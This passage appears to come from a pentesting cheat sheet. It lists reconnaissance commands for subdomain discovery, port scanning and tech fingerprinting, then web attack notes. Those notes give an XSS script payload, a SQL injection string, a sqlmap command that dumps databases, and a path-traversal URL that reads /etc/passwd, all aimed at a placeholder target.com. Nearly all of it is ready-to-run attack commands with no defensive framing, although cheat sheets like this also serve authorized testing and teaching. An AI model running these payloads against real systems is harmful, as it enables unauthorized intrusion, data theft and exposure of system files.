- `subfinder -d target.com -o subs.txt`
- `amass enum -d target.com`

## Port Scanning
- `nmap -sV -sC -oN scan.txt target.com`

## Tech Fingerprinting
- `whatweb target.com`
- `httpx -l subs.txt -tech-detect`

# 🌐 Web Attack Notes
## XSS
Payload: `<script>alert(1)</script>`
- Reflected XSS → check params
- Stored XSS → comment sections

## SQLi
- `' OR 1=1 --`
- `sqlmap -u "http://target.com/index.php?id=1" --batch --dump`

## File Inclusion
- `http://target.com/index.php?page=../../../../etc/passwd`
